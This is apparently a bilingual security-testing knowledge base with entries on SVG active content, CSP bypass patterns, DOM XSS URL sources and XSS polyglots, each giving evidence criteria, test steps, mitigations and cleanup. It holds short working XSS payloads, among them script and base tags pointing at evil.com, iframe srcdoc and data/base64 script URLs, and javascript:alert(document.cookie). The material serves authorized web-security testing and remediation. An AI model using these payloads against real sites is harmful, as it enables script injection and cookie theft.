description.zh: 将用户 SVG 作为隔离下载或可信转换后的位图提供；若必须保留 SVG，使用命名空间感知消毒器移除脚本、事件、foreignObject 与外部引用；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM no longer appears.

review.rationale: SVG 活动内容注入保留为 Payload，用于审查“上传、富文本或内联模板是否允许 SVG 活动元素和事件穿过消毒边界进入文档命名空间”。成立时必须满足证据要求“SVG 进入最终 DOM 后的命名空间、被保留的活动节点以及唯一执行标记三者可以关联”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 已确认 SVG 是内联进入 HTML/SVG 命名空间或以可执行文档方式加载，而不是只经过 img 解码器或附件下载。
prerequisites.en: The SVG is confirmed to enter the inline HTML or SVG namespace or load as an active document rather than pass only through an image decoder or attachment download.

prerequisites.zh: 目标浏览器版本、CSP、SVG sanitizer 和加载方式均已记录，所有事件与外部引用替换为本地固定 marker。
prerequisites.en: The target browser version, CSP, SVG sanitizer, and loading mode are recorded, with every event and external reference replaced by a local fixed marker.

analysis.zh: 阳性证据是 SVG 命名空间中的 script、动画事件或 foreignObject 处理路径实际执行 marker，并由对应 SVG 节点和浏览器调用栈证明。 假阳性边界：SVG 文件上传成功、作为 img 正常显示、源码含 script、外部资源被 CSP 阻止或 sanitizer 已移除活动节点都不构成执行。
analysis.en: Positive evidence requires a script, animation event, or foreignObject path in the SVG namespace to execute the marker, proven by the responsible SVG node and browser call stack. False-positive boundary: Successful SVG upload, normal display through img, script text in source, a CSP-blocked external resource, or sanitizer removal of active nodes does not establish execution.

opsecTips.zh: SVG 活动内容验证不得加载公共外部资源或访问父页面数据；出现跨源导航、重复动画触发或对象 URL 泄漏时停止。
opsecTips.en: SVG Active Content validation must not load public resources or access parent-page data; stop on cross-origin navigation, repeated animation triggers, or object-URL leakage.

opsecTips.zh: 删除上传和内联 SVG、撤销 object/blob URL、清理图片/CDN 缓存及 CSP 报告，并重载宿主页确认无活动节点。
opsecTips.en: Delete uploaded and inline SVGs, revoke object and blob URLs, clear image and CDN caches plus CSP reports, and reload the host page to confirm no active node remains.

name.zh: CSP 绕过模式总表（待拆分）

description.zh: 该集合混合外部脚本、资源提示、base、meta refresh、form 与 iframe 数据 URL，多种浏览器能力不应作为单一 CSP Payload 维护。
description.en: This collection mixes external scripts, resource hints, base, meta refresh, forms, and iframe data URLs, so distinct browser capabilities should not remain one CSP payload entry.

overview.zh: CSP 绕过模式总表（待拆分）混合了多种由不同 CSP 指令控制的浏览器能力。当前需要拆分的问题为：不同指令对脚本执行、子框架、导航、基地址和预加载的控制边界是否被错误地合并为一个结论。共同前提为：策略允许列表过宽、缺少 base-uri 或 frame-src 等专用指令，或者应用同时存在 HTML 注入和可信源上的可控资源。每种模式都必须满足各自的证据标准，即“每一种元素都能映射到明确 CSP 指令、控制台违规事件和实际网络或执行结果，不能只以页面跳转判断”，不能继续共用一个结论。
overview.en: CSP Bypass Pattern Index (Split Required) checks whether controls for script execution, child frames, navigation, base URLs, and preload are incorrectly collapsed into one policy conclusion. It applies when the policy has an overbroad allowlist, omits directives such as base-uri or frame-src, or combines HTML injection with controllable resources on a trusted origin. A conclusion requires each element maps to a specific CSP directive, violation event, and actual network or execution result rather than relying on navigation alone; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 混合维护会掩盖不同指令和处理阶段的真实边界。审计应在“策略允许列表过宽、缺少 base-uri 或 frame-src 等专用指令，或者应用同时存在 HTML 注入和可信源上的可控资源”这一前提下，逐行判断“不同指令对脚本执行、子框架、导航、基地址和预加载的控制边界是否被错误地合并为一个结论”，并为脚本、导航、基地址与资源提示分别收集“每一种元素都能映射到明确 CSP 指令、控制台违规事件和实际网络或执行结果，不能只以页面跳转判断”，避免把普通跳转或预取误报为 CSP 绕过。
vulnerability.en: The risk exists when the policy has an overbroad allowlist, omits directives such as base-uri or frame-src, or combines HTML injection with controllable resources on a trusted origin, allowing whether controls for script execution, child frames, navigation, base URLs, and preload are incorrectly collapsed into one policy conclusion. Review the input source, final parsing context, browser or policy version, and each element maps to a specific CSP directive, violation event, and actual network or execution result rather than relying on navigation alone; otherwise record only an unconfirmed control differential.

exploitation.zh: 先抓取最终响应头并解析生效策略，再把原集合按 JSONP、base、link、meta 和通用脚本模式分别重放，将证据归档到对应细分条目。保存生效响应头后，按 JSONP、base、link、meta 与通用脚本五组逐行核对，保持原始命令字节不变，并将网络、导航、违规事件和执行结果归档到各自目标条目。
exploitation.en: In an authorized isolated environment, capture and parse the effective response policy, then replay the original set by JSONP, base, link, meta, and general script patterns, filing evidence under the matching focused entry. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 拆分维护并部署 nonce 或 hash 驱动的严格 CSP，同时设置 object-src none、base-uri none 与精确的 frame-src、form-action 和 connect-src。拆分后逐个重放合法资源和原始异常行，确认每个模式只有一个主维护位置、所有原行均有归属，并且严格 CSP 对每类能力给出可解释且稳定的决策。
mitigation.en: Remediation should maintain the patterns separately and deploy a nonce- or hash-based strict CSP with object-src none, base-uri none, and precise frame-src, form-action, and connect-src directives. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 盘点“CSP 绕过模式总表（待拆分）”中的浏览器能力
title.en: Inventory mixed capabilities in CSP Bypass Pattern Index (Split Required)

description.zh: 逐行区分脚本、子框架、导航、基地址和资源提示，并把行为映射到实际 CSP 指令。
description.en: Classify script execution, child frames, navigation, base URLs, and resource hints line by line, mapping each behavior to its effective CSP directive and browser stage.

title.zh: 映射“CSP 混合模式拆分”目标条目
title.en: Map CSP Mixed-Pattern Split target entries

description.zh: 将原集合分别归入 xss2-csp-jsonp、xss2-csp-base、xss2-csp-link、xss2-csp-meta、xss2-csp-bypass-patterns，记录重复行和仍缺少归属的模式。
description.en: Route JSONP, base, link, meta, and general policy patterns to xss2-csp-jsonp, xss2-csp-base, xss2-csp-link, xss2-csp-meta, xss2-csp-bypass-patterns, recording duplicates and any original line without coverage.

title.zh: 保留“CSP 绕过模式总表（待拆分）”来源字节
title.en: Preserve CSP Bypass Pattern Index (Split Required) source samples

description.zh: 先抓取最终响应头并解析生效策略，再把原集合按 JSONP、base、link、meta 和通用脚本模式分别重放，将证据归档到对应细分条目；拆分前后核对原命令字符串，避免复制或 JSON 转义改变样例。
description.en: capture and parse the effective response policy, then replay the original set by JSONP, base, link, meta, and general script patterns, filing evidence under the matching focused entry; compare normalized hashes before and after splitting so copying and JSON escaping do not alter the original samples.

attackChain.payload:
<script src=//evil.com/evil.js></script>
<link rel=prefetch href=//evil.com>
<link rel=dns-prefetch href=//evil.com>
<meta http-equiv=refresh content=0;url=javascript:alert(1)>
<base href=//evil.com/>
<form action=javascript:alert(1)><input type=submit>
<iframe srcdoc="<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

title.zh: 逐项验证拆分覆盖
title.en: Verify CSP Bypass Pattern Index (Split Required) split coverage

description.zh: 打开全部目标条目核对教程、链路和命令归属，确认每个模式只有一个主维护位置且导航可达。
description.en: Open every target entry and verify tutorial, chain, and command ownership so each pattern has one primary home and every navigation reference remains reachable.

review.rationale: CSP 绕过模式总表（待拆分）混合了受不同 CSP 指令控制的脚本、导航、基地址和资源提示模式。为避免共用错误的证据标准，将其拆分到五个细粒度 Payload 条目。

prerequisites.zh: 原混合集每一行已映射到外部脚本、资源提示、base、meta、form 或 iframe/data URL 的独立浏览器能力，且捕获实际 CSP。
prerequisites.en: Every line in the mixed set is mapped to its distinct browser capability: external script, resource hint, base, meta, form, or iframe and data URL, with the actual CSP captured.

prerequisites.zh: 所有网络目标使用自有无内容端点和唯一令牌，并能分别观察 CSP report、DOM 变化、导航与资源请求。
prerequisites.en: All network targets use owned content-free endpoints and unique tokens, with separate observation of CSP reports, DOM changes, navigation, and resource requests.

analysis.zh: 阳性证据必须按拆分分支判定：脚本分支需 marker 执行，资源提示需应用浏览器请求，base/meta/form 需实际解析或导航；每种结果不得互相替代。 假阳性边界：DNS 查询、prefetch、普通跨源导航、DOM 中存在标签或 report-only 告警不能被统一称为 CSP 绕过或 XSS。
analysis.en: Positive evidence is branch-specific: script branches need marker execution, resource hints need an application-browser request, and base, meta, or form branches need actual resolution or navigation; one result cannot substitute for another. False-positive boundary: DNS queries, prefetches, ordinary cross-origin navigation, a tag present in the DOM, or report-only alerts cannot all be labeled CSP bypass or XSS.

opsecTips.zh: CSP 混合集每轮只验证一个分支，禁止一次性粘贴整表；出现真实表单提交、第三方请求、下载或顶层导航时停止。
opsecTips.en: The CSP mixed set validates one branch per run and never submits the whole table; stop on real form submission, third-party requests, downloads, or top-level navigation.

opsecTips.zh: 移除各分支测试节点与自有端点，清理 DNS/预加载/浏览器缓存和 CSP 报告队列，并恢复原策略后逐分支回归。
opsecTips.en: Remove branch-specific nodes and owned endpoints, clear DNS, preload, browser caches, and CSP report queues, then restore the original policy and regress each branch.

name.zh: DOM XSS URL 源输入

description.zh: 覆盖 javascript 与 data URL 形式，验证 location、hash、query 等客户端来源进入可执行导航或 HTML sink 时的 DOM XSS。
description.en: Covers javascript and data URL forms to test DOM XSS when location, hash, or query sources reach executable navigation or HTML sinks.

overview.zh: DOM XSS URL 源输入审查客户端源到 sink 的完整数据流。需要确认的核心行为为：客户端脚本是否把可控 URL 片段从 location 系列来源传到 href、src、innerHTML 或动态导航等执行 sink。适用前提为：源值未经过协议允许列表、Trusted Types 或上下文编码就进入 DOM sink，并且浏览器允许对应 URL 方案或文档类型。DOM XSS 的证据标准是：DevTools 数据流、最终 sink 值与唯一执行标记可对应到同一次客户端操作，而服务器响应中可以没有该字符串；服务器响应不包含载荷并不能排除客户端问题。
overview.en: DOM XSS URL Source Inputs checks whether client code moves a controllable URL fragment from location-derived sources into executable sinks such as href, src, innerHTML, or dynamic navigation. It applies when a source value reaches a DOM sink without a protocol allowlist, Trusted Types, or context encoding, and the browser permits the resulting URL scheme or document type. A conclusion requires DevTools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 客户端边界失效的前提为：源值未经过协议允许列表、Trusted Types 或上下文编码就进入 DOM sink，并且浏览器允许对应 URL 方案或文档类型。审计应围绕“客户端脚本是否把可控 URL 片段从 location 系列来源传到 href、src、innerHTML 或动态导航等执行 sink”记录源值、解码次数、赋值 API 与执行上下文。只有取得“DevTools 数据流、最终 sink 值与唯一执行标记可对应到同一次客户端操作，而服务器响应中可以没有该字符串”，才能证明可控数据到达了可执行 sink。
vulnerability.en: The risk exists when a source value reaches a DOM sink without a protocol allowlist, Trusted Types, or context encoding, and the browser permits the resulting URL scheme or document type, allowing whether client code moves a controllable URL fragment from location-derived sources into executable sinks such as href, src, innerHTML, or dynamic navigation. Review the input source, final parsing context, browser or policy version, and DevTools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string; otherwise record only an unconfirmed control differential.

exploitation.zh: 对 hash、query 与完整 URL 分别设置同一标记，单步跟踪读取、解码和写入位置，确认危险方案是在赋值前还是赋值后形成。在 DevTools 中分别对真实读取点和写入点设置断点，使用一次性标记跟踪源值、规范化结果与最终 DOM；每轮只改变一个来源或 sink，避免把导航限制或 CSP 阻断误认为数据流已经修复。
exploitation.en: In an authorized isolated environment, place the same marker in hash, query, and full-URL sources, then step through reading, decoding, and assignment to determine whether the dangerous scheme forms before or after the sink. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 用 textContent 和固定 DOM API 替代 HTML 字符串写入，对导航目标执行 https/http 同源或业务允许列表，并启用 Trusted Types 限制危险 sink。回归应覆盖原客户端来源、合法业务 URL 或文本以及最小危险值，确认安全 API 保留原功能，且危险 sink 不再收到攻击者可控字符串。
mitigation.en: Remediation should replace HTML string writes with textContent and fixed DOM APIs, allowlist same-origin or approved https/http navigation targets, and enforce Trusted Types for dangerous sinks. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 追踪“DOM XSS URL 源输入”的客户端来源
title.en: Scope the DOM XSS URL Source Inputs data flow

description.zh: 从 URL、消息或接口值单步跟踪到实际 DOM API，核对前提“源值未经过协议允许列表、Trusted Types 或上下文编码就进入 DOM sink，并且浏览器允许对应 URL 方案或文档类型”及所有中间解码步骤。
description.en: Trace the real input to the final sink or policy decision, confirm that a source value reaches a DOM sink without a protocol allowlist, Trusted Types, or context encoding, and the browser permits the resulting URL scheme or document type, and record browser, response-header, and relevant component versions.

title.zh: 断点核对“DOM XSS 数据流” Sink
title.en: Establish the DOM XSS Data Flow baseline

description.zh: 在读取点和写入点记录运行时值、调用栈与最终 DOM，并采用“DevTools 数据流、最终 sink 值与唯一执行标记可对应到同一次客户端操作，而服务器响应中可以没有该字符串”作为成立标准。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only DevTools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string as valid evidence.

title.zh: 单变量验证“DOM XSS URL 源输入”
title.en: Run a single-variable DOM XSS URL Source Inputs check

description.zh: 对 hash、query 与完整 URL 分别设置同一标记，单步跟踪读取、解码和写入位置，确认危险方案是在赋值前还是赋值后形成；保持页面状态不变，逐个来源和 sink 重放原样例，排除导航与 CSP 阻断差异。
description.en: place the same marker in hash, query, and full-URL sources, then step through reading, decoding, and assignment to determine whether the dangerous scheme forms before or after the sink; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload: javascript:alert(1) javascript:alert(document.cookie) javascript:prompt(1) javascript:confirm(1) javascript:void(alert(1)) javascript:void(0)//&alert(1) data:text/html, data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== data:text/html, data:text/html,

title.zh: 替换危险 API 并复测
title.en: Retest the DOM XSS URL Source Inputs remediation boundary

description.zh: 用 textContent 和固定 DOM API 替代 HTML 字符串写入，对导航目标执行 https/http 同源或业务允许列表，并启用 Trusted Types 限制危险 sink；使用相同来源回放正常与异常值，确认安全 API 保留功能且不再产生执行路径。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while DevTools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string no longer appears.

review.rationale: DOM XSS URL 源输入保留为 Payload，用于审查“客户端脚本是否把可控 URL 片段从 location 系列来源传到 href、src、innerHTML 或动态导航等执行 sink”。成立时必须满足证据要求“DevTools 数据流、最终 sink 值与唯一执行标记可对应到同一次客户端操作，而服务器响应中可以没有该字符串”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: location、hash 或 query 等客户端来源可控，并在真实应用代码中流入导航、HTML 写入或动态代码 sink。
prerequisites.en: A controllable client source such as location, hash, or query flows through real application code into navigation, HTML-writing, or dynamic-code sinks.

prerequisites.zh: 已启用浏览器 source-to-sink 跟踪和 DOM 快照，javascript/data URL 中只保留设置一次性内存标志的 marker。
prerequisites.en: Browser source-to-sink tracing and DOM snapshots are enabled, and javascript or data URLs contain only a marker that sets a one-time in-memory flag.

analysis.zh: 阳性证据是可控 URL 值沿应用数据流到达可执行 sink，并在应用页面上下文执行 marker；需保留读取源、赋值点与调用栈。 假阳性边界：地址栏包含 javascript 字符串、URL 被显示、普通重定向、浏览器直接手工导航或 CSP 阻止执行均不是 DOM XSS 数据流证据。
analysis.en: Positive evidence requires the controllable URL value to follow the application data flow into an executable sink and run the marker in the application-page context, preserving source read, assignment, and call stack. False-positive boundary: A javascript string in the address bar, URL display, ordinary redirect, manual browser navigation, or CSP-blocked execution is not evidence of a DOM XSS data flow.

opsecTips.zh: DOM XSS URL 测试禁止读取 cookie、storage 或 DOM 敏感字段；发生历史循环、跨源跳转、页面卸载或外连时立即停止。
opsecTips.en: DOM XSS URL testing must not read cookies, storage, or sensitive DOM fields; stop on history loops, cross-origin navigation, page unload, or egress.

opsecTips.zh: 清除测试 query/hash、history 状态、session/local storage 和 marker 节点，恢复路由并重新加载确认 sink 不再收到测试值。
opsecTips.en: Clear test query and hash values, history state, session and local storage, and marker nodes, restore routing, and reload to confirm the sink no longer receives the test value.

name.zh: 跨上下文 XSS Polyglot

description.zh: 用同时包含标签闭合、属性事件、URL 方案与 SVG 片段的组合输入，识别应用未知或多阶段输出上下文中的解析突破。
description.en: Uses combined tag closures, event attributes, URL schemes, and SVG fragments to identify parser breakouts when the output context is unknown or changes across stages.

overview.zh: 跨上下文 XSS Polyglot用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：同一输入经过模板、HTML tokenizer 和 JavaScript 或 URL 子解析器后，是否在至少一个上下文形成可执行结构。测试成立的前提为：应用在不同视图复用同一字段或经过多次编码解码，导致开发者无法用单一 HTML 文本编码覆盖最终上下文。证据要求为：记录实际命中的闭合序列、最终 DOM 节点与执行事件，不能把任意响应变化归因于 Polyglot 成功。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: Cross-Context XSS Polyglot checks whether one input becomes executable in at least one context after passing through templating, the HTML tokenizer, and JavaScript or URL subparsers. It applies when the application reuses one field across views or performs multiple encode/decode stages, so one HTML-text encoding rule does not match the final context. A conclusion requires the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：应用在不同视图复用同一字段或经过多次编码解码，导致开发者无法用单一 HTML 文本编码覆盖最终上下文。审查时必须确认“同一输入经过模板、HTML tokenizer 和 JavaScript 或 URL 子解析器后，是否在至少一个上下文形成可执行结构”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“记录实际命中的闭合序列、最终 DOM 节点与执行事件，不能把任意响应变化归因于 Polyglot 成功”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the application reuses one field across views or performs multiple encode/decode stages, so one HTML-text encoding rule does not match the final context, allowing whether one input becomes executable in at least one context after passing through templating, the HTML tokenizer, and JavaScript or URL subparsers. Review the input source, final parsing context, browser or policy version, and the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot; otherwise record only an unconfirmed control differential.

exploitation.zh: 先用单字符探针判断引号、标签和脚本边界，再提交原 Polyglot 集合；每次只保留最小可复现片段以定位真正有效的解析分支。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, probe quote, tag, and script boundaries with single characters before submitting the original polyglot set, then minimize any success to the actual parser branch. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 在数据写入每个最终 sink 时重新执行上下文编码，减少跨视图原样复用，并用模板自动转义、HTML 消毒与 Trusted Types 形成分层控制。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should apply context encoding at every final sink, reduce raw reuse across views, and layer template auto-escaping, HTML sanitization, and Trusted Types. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 定位“跨上下文 XSS Polyglot”的输出上下文
title.en: Scope the Cross-Context XSS Polyglot data flow

description.zh: 沿真实业务入口追踪到最终 HTML 位置，核对前提“应用在不同视图复用同一字段或经过多次编码解码，导致开发者无法用单一 HTML 文本编码覆盖最终上下文”，并记录模板、消毒器和浏览器版本。
description.en: Trace the real input to the final sink or policy decision, confirm that the application reuses one field across views or performs multiple encode/decode stages, so one HTML-text encoding rule does not match the final context, and record browser, response-header, and relevant component versions.

title.zh: 建立“多解析上下文”解析基线
title.en: Establish the Multiple Parsing Contexts baseline

description.zh: 先提交普通文本与边界字符，保存响应和最终 DOM；有效执行必须满足证据要求“记录实际命中的闭合序列、最终 DOM 节点与执行事件，不能把任意响应变化归因于 Polyglot 成功”。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only the exact breakout sequence, final DOM node, and execution event are recorded rather than attributing any response change to a successful polyglot as valid evidence.

title.zh: 逐条重放“跨上下文 XSS Polyglot”样例
title.en: Run a single-variable Cross-Context XSS Polyglot check

description.zh: 先用单字符探针判断引号、标签和脚本边界，再提交原 Polyglot 集合；每次只保留最小可复现片段以定位真正有效的解析分支；每次只替换一行并缩减命中项，所有外部地址均改为隔离测试端点。
description.en: probe quote, tag, and script boundaries with single characters before submitting the original polyglot set, then minimize any success to the actual parser branch; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.
